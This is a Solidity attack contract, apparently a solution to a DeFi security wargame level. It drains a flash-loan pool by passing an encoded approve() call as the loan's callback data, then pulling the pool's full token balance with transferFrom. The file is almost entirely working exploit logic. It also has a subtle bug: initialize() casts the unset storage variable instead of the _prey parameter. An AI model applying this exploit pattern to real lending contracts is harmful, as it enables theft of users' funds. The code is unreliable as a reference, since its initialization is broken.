// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
import "./TrusterLenderPool.sol";

/*
* @title: 
* @author: Anthony (fps) https://github.com/fps8k .
* @dev: 
*/

contract Attack
{
    TrusterLenderPool public prey;
    IERC20 token;
    address target = address(this);
    uint256 public amount;
    uint public _p;
    uint public _t;

    function initialize(address _prey, address _token) public
    {
        prey = TrusterLenderPool(prey);
        token = IERC20(_token);
    
        amount = token.balanceOf(address(prey));
    }
    
    function execute() public
    {
        prey.flashLoan(0, address(this), address(token), abi.encodeWithSignature("approve(address,uint256)", target, amount));
    }

    function magic() public
    {
        token.transferFrom(address(prey), address(this), amount);
    }

    function balances() public
    {
        _p = token.balanceOf(address(prey));
        _t = token.balanceOf(address(this));
    }
}